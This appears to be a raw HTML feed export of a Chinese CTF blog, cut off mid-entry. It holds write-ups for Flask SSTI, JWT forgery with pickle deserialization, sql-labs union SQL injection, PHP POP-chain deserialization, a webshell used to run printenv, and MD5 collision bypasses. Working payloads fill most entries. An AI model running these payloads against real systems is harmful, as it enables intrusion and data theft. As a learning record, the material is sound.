class="hljs-template-variable">&#123;&#123;<span class="hljs-name">[].__class__.__bases__</span>[0].__subclasses__()[58].__init__[&#x27;__glo&#x27;+&#x27;bals__&#x27;][&#x27;__builtins__&#x27;][&#x27;eval&#x27;](<span class="hljs-name">&#x27;__import__(&quot;os&quot;).popen(&quot;cat flasklight/coomme_geeeett_youur_flek&quot;).read()&#x27;</span>)&#125;&#125;</span><br></code></pre></td></tr></table></figure><p><a href="https://cloud.tencent.com/developer/article/2124510">关于flask的SSTI注入[通俗易懂]</a><br><a href="https://xz.aliyun.com/t/3679?time__1311=n4+xnD0DBDgDc7D9DUO4BqOoTnl7WSWDIxrD#toc-8">flask之ssti模版注入从零到入门</a></p><h2 id="ciscn2019-华北赛区-day1-web2-ikun"><a href="#ciscn2019-华北赛区-day1-web2-ikun" class="headerlink" title="ciscn2019-华北赛区-day1-web2-ikun"></a>ciscn2019-华北赛区-day1-web2-ikun</h2><p>根据页面的提示，需要找到lv6<br>但是翻了很多页也没有找到lv6<br>写一个python脚本</p><figure class="highlight maxima"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs maxima">import requests<br><br>url = &#x27;http://eca3df9d-<span class="hljs-number">0ecd</span>-<span class="hljs-number">46b6</span>-b0ab-7166f51fb956.node5.buuoj.cn:<span class="hljs-number">81</span>/shop?page=&#x27;<br><br><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">1</span>,<span class="hljs-number">2000</span>):<br>    a = requests.<span class="hljs-built_in">get</span>(url + str(i))<br>    <span class="hljs-keyword">if</span> &#x27;lv6.png&#x27; <span class="hljs-keyword">in</span> a.text:<br>        <span class="hljs-built_in">print</span>(i)<br>        <span class="hljs-built_in">break</span><br><br></code></pre></td></tr></table></figure><p>在181页发现lv6<br>发现价格有点高，看能不能抓包改下价格<br>只能改折扣<br><img src="/images/JBFBSKZY4FWH5KWZ7KC.png"></p><p><img src="/images/V7NOFLUCZI1RNT.png"><br>这里涉及到JWT伪造漏洞<br>攻击工具<a href="https://link.csdn.net/?target=https://github.com/brendan-rius/c-jwt-cracker">c-jwt-cracker</a>获得密匙<br>我使用的是kali系统<br><img src="/images/ECFP2LKJ1JB7QPI9LO8.png"><br>破解获得密匙1Kun<br>然后访问<a href="https://jwt.io/">JWT攻击网站</a>,将JWT复制上去即可<br><img src="/images/JNBAT35QJHZPXF.png"><br>将username改为admin，还有将刚才的密匙填入<br>将cookies的JWT替换，得到<br><img src="/images/YLWH6TZTRJ3H32BKER9.png"><br>源码中发现<br><img src="/images/R8M363537PNFDRFIUH.png"></p><p>找到admin.py<br><img src="/images/CHUL1P513UOV9ZY610EI.png"><br>这里可以理解为与php一样的反序列化</p><p>self.render(‘form.html’, res&#x3D;p, member&#x3D;1)<br>这段代码的意思就是找到模板文件，进行渲染，从而显示页面<br>来观察一下form.html页面<br><img src="/images/P0U5OSG2IY3UT03FE6C.png"><br>说明传入的是可以直接进行回显的，而且可以将自定义的类进行序列化和反序列化，因此存在Pickle反序列化漏洞，那我们就可以构造一个通过pickle.dumps序列化的payload，从而被解析读取flag或其他信息。<br>我们构建一个类，类里面的__reduce__python魔术方法会在该类被反序列化的时候会被调用<br>构造payload可以使用方法__reduce__(self)，先要获取的flag文件的位置，然后进行读取</p><p>点击一键成为大会员后，替换become<br>os.system和os.popen<br>os.system 调用系统命令，完成后退出，返回结果是命令执行状态，一般是0<br>os.popen() 无法读取程序执行的返回值<br>这两个函数只有以print输出时才会回显，如果是以return返回的就不会显示结果。<br>可以使用commands.getoutput()这个函数来进行代替，构造payload</p><figure class="highlight haskell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs haskell"><span class="hljs-keyword">import</span> pickle<br><span class="hljs-keyword">import</span> urllib<br><span class="hljs-keyword">import</span> commands<br><span class="hljs-class"></span><br><span class="hljs-class"><span class="hljs-keyword">class</span> payload(<span class="hljs-title">object</span>):</span><br><span class="hljs-class">    def __reduce__(<span class="hljs-title">self</span>):</span><br><span class="hljs-class">       return (<span class="hljs-title">commands</span>.<span class="hljs-title">getoutput</span>,(&#x27;<span class="hljs-title">ls</span> /&#x27;,))</span><br><span class="hljs-class"></span><br><span class="hljs-class">a = pickle.dumps(<span class="hljs-title">payload</span>())</span><br><span class="hljs-class">a = urllib.quote(<span class="hljs-title">a</span>)</span><br><span class="hljs-class">print a</span><br><span class="hljs-class"></span><br></code></pre></td></tr></table></figure><p><img src="/images/VCLCNT98$GCXFF8.png"></p><p><img src="/images/JN7XR4QJ48H7LL1I58.png"></p><p>找到flag.txt文件，并读取</p><figure class="highlight haskell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs haskell"><span class="hljs-keyword">import</span> pickle<br><span class="hljs-keyword">import</span> urllib<br><span class="hljs-keyword">import</span> commands<br><span class="hljs-class"></span><br><span class="hljs-class"><span class="hljs-keyword">class</span> payload(<span class="hljs-title">object</span>):</span><br><span class="hljs-class">    def __reduce__(<span class="hljs-title">self</span>):</span><br><span class="hljs-class">       return (<span class="hljs-title">commands</span>.<span class="hljs-title">getoutput</span>,(&#x27;<span class="hljs-title">cat</span> /<span class="hljs-title">flag</span>.<span class="hljs-title">txt&#x27;</span>,))</span><br><span class="hljs-class"></span><br><span class="hljs-class">a = pickle.dumps(<span class="hljs-title">payload</span>())</span><br><span class="hljs-class">a = urllib.quote(<span class="hljs-title">a</span>)</span><br><span class="hljs-class">print a</span><br><span class="hljs-class"></span><br></code></pre></td></tr></table></figure><p>或</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> pickle<br><span class="hljs-keyword">import</span> urllib<br><span class="hljs-keyword">import</span> commands<br><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">payload</span>(<span class="hljs-title class_ inherited__">object</span>):<br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">__reduce__</span>(<span class="hljs-params">self</span>):<br>       <span class="hljs-keyword">return</span> (<span class="hljs-built_in">eval</span>, (<span class="hljs-string">&quot;open(&#x27;/flag.txt&#x27;,&#x27;r&#x27;).read()&quot;</span>,))<br><br>a = pickle.dumps(payload())<br>a = urllib.quote(a)<br><span class="hljs-built_in">print</span> a<br><br></code></pre></td></tr></table></figure><p><a href="https://www.freebuf.com/articles/web/252189.html">Python Pickle反序列化漏洞</a><br><a href="https://www.cnblogs.com/cjsblog/p/9277677.html">认识JWT</a></p>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>sql-labs</title>
    <link href="/2023/12/14/sql-labs/"/>
    <url>/2023/12/14/sql-labs/</url>
    
    <content type="html"><![CDATA[<h2 id="web517"><a href="#web517" class="headerlink" title="web517"></a>web517</h2><p>直接payload</p><figure class="highlight crmsh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs crmsh">?<span class="hljs-attr">id=</span>-<span class="hljs-number">1</span>&#x27; <span class="hljs-keyword">order</span> <span class="hljs-title">by</span> <span class="hljs-number">3</span>--+<br>//<span class="hljs-keyword">order</span> <span class="hljs-title">by</span> <span class="hljs-number">4</span>就会出错，说明回显位有三个<br>?<span class="hljs-attr">id=</span>-<span class="hljs-number">1</span>&#x27; union select <span class="hljs-number">1</span>,<span class="hljs-number">2</span>,<span class="hljs-number">3</span>--+<br>//回显<span class="hljs-number">2</span>，<span class="hljs-number">3</span>说明<span class="hljs-number">2</span>，<span class="hljs-number">3</span>为回显位<br></code></pre></td></tr></table></figure><p>先浅浅爆个库</p><figure class="highlight applescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs applescript">?<span class="hljs-built_in">id</span>=<span class="hljs-number">-1</span>&#x27; union select <span class="hljs-number">1</span>,<span class="hljs-number">2</span>,group_concat(schema_name) <span class="hljs-keyword">from</span> information_schema.schemata<span class="hljs-comment">--+</span><br></code></pre></td></tr></table></figure><p><img src="/images/UOG6DQRFVQBV9BY0M4Y7.png"><br>库用ctfshow的</p><p>爆表</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs routeros">?<span class="hljs-attribute">id</span>=-1&#x27; union select 1,2,group_concat(table_name) <span class="hljs-keyword">from</span> information_schema.tables where <span class="hljs-attribute">table_schema</span>=<span class="hljs-string">&#x27;ctfshow&#x27;</span>--+<br></code></pre></td></tr></table></figure><p><img src="/images/PJZHDF7NPLW1462LL0W.png"></p><p>爆字段</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs routeros">?<span class="hljs-attribute">id</span>=-1&#x27; union select 1,2,group_concat(column_name) <span class="hljs-keyword">from</span> information_schema.columns where <span class="hljs-attribute">table_name</span>=<span class="hljs-string">&#x27;flag&#x27;</span>--+<br></code></pre></td></tr></table></figure><p><img src="/images/ZXTM998QU2PD8UYRK.png"></p><p>爆值</p><figure class="highlight applescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs applescript">?<span class="hljs-built_in">id</span>=<span class="hljs-number">-1</span>&#x27; union select <span class="hljs-number">1</span>,<span class="hljs-number">2</span>,group_concat(flag) <span class="hljs-keyword">from</span> flag<span class="hljs-comment">--+</span><br></code></pre></td></tr></table></figure><p><img src="/images/ORRI9MUUD9VVM.png"><br>报错了，改为ctfshow库下的</p><figure class="highlight q"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs q">?id-<span class="hljs-number">-1</span>&#x27; <span class="hljs-built_in">union</span> <span class="hljs-keyword">select</span> <span class="hljs-number">1</span>,<span class="hljs-number">2</span>,group_concat(flag) <span class="hljs-keyword">from</span> ctfshow.flag--+<br></code></pre></td></tr></table></figure><h2 id="web518"><a href="#web518" class="headerlink" title="web518"></a>web518</h2><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs routeros">?<span class="hljs-attribute">id</span>=1  正常<br>?<span class="hljs-attribute">id</span>=1&quot;  报错 <span class="hljs-string">&#x27; &quot; LIMIT 0,1 &#x27;</span><br>?<span class="hljs-attribute">id</span>=1--+  正常<br><br>判断是数字型注入<br></code></pre></td></tr></table></figure><p>其余和上题相同</p><h2 id="web519"><a href="#web519" class="headerlink" title="web519"></a>web519</h2><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs routeros">?<span class="hljs-attribute">id</span>=1  正常<br>?<span class="hljs-attribute">id</span>=1&quot;  正常<br>?<span class="hljs-attribute">id</span>=2&quot;  正常<br>?<span class="hljs-attribute">id</span>=1&quot;--+  正常<br>?<span class="hljs-attribute">id</span>=;/&#x27;;[]<span class="hljs-string">&#x27;    报错 &#x27;</span> ;/<span class="hljs-string">&#x27;;[]&#x27;</span><span class="hljs-string">&#x27;) LIMIT 0,1 &#x27;</span><br>           <br>判断是字符型注入，闭合方式是<span class="hljs-string">&#x27;)</span><br></code></pre></td></tr></table></figure><p>其余同上</p><h2 id="web520"><a href="#web520" class="headerlink" title="web520"></a>web520</h2><p>经过这几题的测试发现输入?id&#x3D;\报错能帮我们判断几乎全部的闭合方式，不确定是否为一特性<br>例<br>本题</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs routeros">?<span class="hljs-attribute">id</span>=\<br></code></pre></td></tr></table></figure><p><img src="/images/DU24U0QGA8FZKHQMEE5LD.png"><br>可判断闭合方式为\后的<code>&quot;)</code><br>下面同上题</p>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>ISCTF2023</title>
    <link href="/2023/12/01/ISCTF2023/"/>
    <url>/2023/12/01/ISCTF2023/</url>
    
    <content type="html"><![CDATA[<h2 id="圣杯战争！！！"><a href="#圣杯战争！！！" class="headerlink" title="圣杯战争！！！"></a>圣杯战争！！！</h2><p>反序列化题</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><code class="hljs php"> <span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br><span class="hljs-title function_ invoke__">error_reporting</span>(<span class="hljs-number">0</span>);<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">artifact</span></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$excalibuer</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$arrow</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__toString</span>(<span class="hljs-params"></span>)</span>&#123;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;为Saber选择了对的武器!&lt;br&gt;&quot;</span>;<br>        <span class="hljs-keyword">return</span> <span class="hljs-variable language_">$this</span>-&gt;excalibuer-&gt;arrow;<br>    &#125;<br>&#125;<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">prepare</span></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$release</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__get</span>(<span class="hljs-params"><span class="hljs-variable">$key</span></span>)</span>&#123;<br>        <span class="hljs-variable">$functioin</span> = <span class="hljs-variable language_">$this</span>-&gt;release;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;蓄力!咖喱棒！！&lt;br&gt;&quot;</span>;<br>        <span class="hljs-keyword">return</span> <span class="hljs-variable">$functioin</span>();<br>    &#125;<br>&#125;<br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">saber</span></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$weapon</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__invoke</span>(<span class="hljs-params"></span>)</span>&#123;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;胜利！&lt;br&gt;&quot;</span>;<br>        <span class="hljs-keyword">include</span>(<span class="hljs-variable language_">$this</span>-&gt;weapon);<br>    &#125;<br>&#125;<br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">summon</span></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$Saber</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$Rider</span>;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__wakeup</span>(<span class="hljs-params"></span>)</span>&#123;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;开始召唤从者！&lt;br&gt;&quot;</span>;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-variable language_">$this</span>-&gt;Saber;<br>    &#125;<br>&#125;<br><br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;payload&#x27;</span>]))&#123;<br>    <span class="hljs-title function_ invoke__">unserialize</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;payload&#x27;</span>]);<br>&#125;<br><span class="hljs-meta">?&gt;</span> <br></code></pre></td></tr></table></figure><p>比较简单的反序列化题<br>先找到include来个伪协议<br>然后找下一个，__invoke需要被当成函数调用才会触发<br>那就new一个prepare<br>赋值给releace<br>但它的__Get方法还没触发，找下一个<br>__get是调用的成员属性是私有属性或不存在时触发<br>找到artifact中有两个参数，new一下<br>赋值excalibuer，而arrow负责调用__get<br>而__tostring需要表达方式错误导致魔术方法触发（把对象当成字符串调用）<br>echo是输出字符串的<br>所以new一个summon<br>saber赋值为summon</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs routeros"><span class="hljs-variable">$a</span>=new saber();<br><span class="hljs-variable">$a</span>-&gt;<span class="hljs-attribute">weapon</span>=<span class="hljs-string">&#x27;php://filter/convert.base64-encode/resource=flag.php&#x27;</span>;<br><span class="hljs-variable">$b</span>=new prepare();<br><span class="hljs-variable">$b</span>-&gt;<span class="hljs-attribute">release</span>=<span class="hljs-variable">$a</span>;//调用了__invoke<br><span class="hljs-variable">$c</span>=new artifact();<br><span class="hljs-variable">$c</span>-&gt;<span class="hljs-attribute">excalibuer</span>=<span class="hljs-variable">$b</span>;<br><span class="hljs-variable">$c</span>-&gt;<span class="hljs-attribute">arrow</span>=<span class="hljs-string">&#x27;123&#x27;</span>;//调用了__get<br><span class="hljs-variable">$d</span>=new summon();<br><span class="hljs-variable">$d</span>-&gt;<span class="hljs-attribute">Saber</span>=<span class="hljs-variable">$c</span>;//echo 调用了__toString<br>echo serialize(<span class="hljs-variable">$d</span>);<br></code></pre></td></tr></table></figure><h2 id="where-is-the-flag"><a href="#where-is-the-flag" class="headerlink" title="where_is_the_flag"></a>where_is_the_flag</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs php"> <span class="hljs-meta">&lt;?php</span><br><span class="hljs-comment">//flag一分为3，散落在各处，分别是：xxxxxxxx、xxxx、xxx。</span><br><span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br><br><span class="hljs-comment">//标准一句话木马~</span><br><span class="hljs-keyword">eval</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-number">1</span>]);<br><span class="hljs-meta">?&gt;</span> <br></code></pre></td></tr></table></figure><p>既然都这么写了，那么直接蚁剑连接省事的多<br>第一段flag在flag.php中</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-variable">$flag</span> = <span class="hljs-string">&quot;FLAG1:ISCTF&#123;6ced&quot;</span>;<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>第二段flag在根目录中</p><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs yaml"><span class="hljs-number">6033</span><span class="hljs-string">-a4ec-</span><br></code></pre></td></tr></table></figure><p>第三段flag找了很多文件都没找到<br>在根目录里发现了一个冒红光的文件<br><img src="/images/KX28RD7MM3K2B26.png"></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-meta">#!/bin/sh</span><br>sed -i <span class="hljs-string">&quot;s/&#123;&#123;FLAG1&#125;&#125;/<span class="hljs-variable">$&#123;FLAG:0:10&#125;</span>/&quot;</span> /var/www/localhost/htdocs/flag.php<br><span class="hljs-built_in">echo</span> <span class="hljs-variable">$&#123;FLAG:10:10&#125;</span> &gt; /flag2<br><span class="hljs-built_in">export</span> FLAG3=<span class="hljs-variable">$&#123;FLAG:20&#125;</span><br>FLAG3=<span class="hljs-variable">$&#123;FLAG:20&#125;</span><br><span class="hljs-built_in">export</span> FLAG=<span class="hljs-string">&quot;flag&quot;</span><br>FLAG=<span class="hljs-string">&quot;flag&quot;</span><br>httpd -D FOREGROUND<br></code></pre></td></tr></table></figure><p>export是创建一个环境变量的意思<br>看来第三段flag在环境变量中<br>回到页面执行命令</p><figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs ruby"><span class="hljs-number">1</span>=system(<span class="hljs-string">&#x27;printenv&#x27;</span>);<br><span class="hljs-regexp">//</span><span class="hljs-variable constant_">HOSTNAME</span>=d38fc96b0fdf <span class="hljs-variable constant_">SHLVL</span>=<span class="hljs-number">2</span> <span class="hljs-variable constant_">HOME</span>=<span class="hljs-regexp">/root FLAG3=4f5c-bb37-ee81a5ecc139&#125; PATH=/usr</span><span class="hljs-regexp">/local/sbin</span><span class="hljs-symbol">:/usr/local/bin</span><span class="hljs-symbol">:/usr/sbin</span><span class="hljs-symbol">:/usr/bin</span><span class="hljs-symbol">:/sbin</span><span class="hljs-symbol">:/bin</span> <span class="hljs-variable constant_">PWD</span>=<span class="hljs-regexp">/var/www</span><span class="hljs-regexp">/localhost/htdocs</span> <span class="hljs-variable constant_">FLAG</span>=flag<br></code></pre></td></tr></table></figure><h2 id="绕进你的心里"><a href="#绕进你的心里" class="headerlink" title="绕进你的心里"></a>绕进你的心里</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs php"> <span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br><span class="hljs-title function_ invoke__">error_reporting</span>(<span class="hljs-number">0</span>);<br><span class="hljs-keyword">require</span> <span class="hljs-string">&#x27;flag.php&#x27;</span>;<br><span class="hljs-variable">$str</span> = (String)<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;pan_gu&#x27;</span>];<br><span class="hljs-variable">$num</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;zhurong&#x27;</span>];<br><span class="hljs-variable">$lida1</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;hongmeng&#x27;</span>];<br><span class="hljs-variable">$lida2</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;shennong&#x27;</span>];<br><span class="hljs-keyword">if</span>(<span class="hljs-variable">$lida1</span> !== <span class="hljs-variable">$lida2</span> &amp;&amp; <span class="hljs-title function_ invoke__">md5</span>(<span class="hljs-variable">$lida1</span>) === <span class="hljs-title function_ invoke__">md5</span>(<span class="hljs-variable">$lida2</span>))&#123;<br>    <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;md5绕过了!&quot;</span>;<br>    <span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&quot;/[0-9]/&quot;</span>, <span class="hljs-variable">$num</span>))&#123;<br>        <span class="hljs-keyword">die</span>(<span class="hljs-string">&#x27;你干嘛?哎哟!&#x27;</span>);<br>    &#125;<br>    <span class="hljs-keyword">elseif</span>(<span class="hljs-title function_ invoke__">intval</span>(<span class="hljs-variable">$num</span>))&#123;<br>        <span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&#x27;/.+?ISCTF/is&#x27;</span>, <span class="hljs-variable">$str</span>))&#123;<br>            <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;再想想!&quot;</span>);<br>        &#125;<br>        <span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">stripos</span>(<span class="hljs-variable">$str</span>, <span class="hljs-string">&#x27;2023ISCTF&#x27;</span>) === <span class="hljs-literal">false</span>)&#123;<br>            <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;就差一点点啦!&quot;</span>);<br>        &#125;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-variable">$flag</span>;<br>    &#125;<br>&#125;<br><span class="hljs-meta">?&gt;</span> <br></code></pre></td></tr></table></figure><p>第一个if是md5强碰撞</p><figure class="highlight llvm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs llvm">hongmeng<span class="hljs-operator">=</span>M<span class="hljs-variable">%C9h</span><span class="hljs-variable">%FF</span><span class="hljs-variable">%0</span>E<span class="hljs-variable">%E3</span><span class="hljs-variable">%5</span>C<span class="hljs-variable">%20</span><span class="hljs-variable">%95</span>r<span class="hljs-variable">%D4w</span><span class="hljs-variable">%7</span>Br<span class="hljs-variable">%15</span><span class="hljs-variable">%87</span><span class="hljs-variable">%D3o</span><span class="hljs-variable">%A7</span><span class="hljs-variable">%B2</span><span class="hljs-variable">%1</span>B<span class="hljs-variable">%DCV</span><span class="hljs-variable">%B7J</span><span class="hljs-variable">%3</span>D<span class="hljs-variable">%C0x</span><span class="hljs-variable">%3</span>E<span class="hljs-variable">%7</span>B<span class="hljs-variable">%95</span><span class="hljs-variable">%18</span><span class="hljs-variable">%AF</span><span class="hljs-variable">%BF</span><span class="hljs-variable">%A2</span><span class="hljs-variable">%00</span><span class="hljs-variable">%A8</span><span class="hljs-variable">%28</span>K<span class="hljs-variable">%F3n</span><span class="hljs-variable">%8</span>EKU<span class="hljs-variable">%B3_Bu</span><span class="hljs-variable">%93</span><span class="hljs-variable">%D8Igm</span><span class="hljs-variable">%A0</span><span class="hljs-variable">%D1U</span><span class="hljs-variable">%5</span>D<span class="hljs-variable">%83</span><span class="hljs-variable">%60</span><span class="hljs-variable">%FB_</span><span class="hljs-variable">%07</span><span class="hljs-variable">%FE</span><span class="hljs-variable">%A2</span>&amp;shennong<span class="hljs-operator">=</span>M<span class="hljs-variable">%C9h</span><span class="hljs-variable">%FF</span><span class="hljs-variable">%0</span>E<span class="hljs-variable">%E3</span><span class="hljs-variable">%5</span>C<span class="hljs-variable">%20</span><span class="hljs-variable">%95</span>r<span class="hljs-variable">%D4w</span><span class="hljs-variable">%7</span>Br<span class="hljs-variable">%15</span><span class="hljs-variable">%87</span><span class="hljs-variable">%D3o</span><span class="hljs-variable">%A7</span><span class="hljs-variable">%B2</span><span class="hljs-variable">%1</span>B<span class="hljs-variable">%DCV</span><span class="hljs-variable">%B7J</span><span class="hljs-variable">%3</span>D<span class="hljs-variable">%C0x</span><span class="hljs-variable">%3</span>E<span class="hljs-variable">%7</span>B<span class="hljs-variable">%95</span><span class="hljs-variable">%18</span><span class="hljs-variable">%AF</span><span class="hljs-variable">%BF</span><span class="hljs-variable">%A2</span><span class="hljs-variable">%02</span><span class="hljs-variable">%A8</span><span class="hljs-variable">%28</span>K<span class="hljs-variable">%F3n</span><span class="hljs-variable">%8</span>EKU<span class="hljs-variable">%B3_Bu</span><span class="hljs-variable">%93</span><span class="hljs-variable">%D8Igm</span><span class="hljs-variable">%A0</span><span class="hljs-variable">%D1</span><span class="hljs-variable">%D5</span><span class="hljs-variable">%5</span>D<span class="hljs-variable">%83</span><span class="hljs-variable">%60</span><span class="hljs-variable">%FB_</span><span class="hljs-variable">%07</span><span class="hljs-variable">%FE</span><span class="hljs-variable">%A2</span><br></code></pre></td></tr></table></figure><p>preg_match数组绕过即可</p><figure class="highlight ruby"><table><tr><td 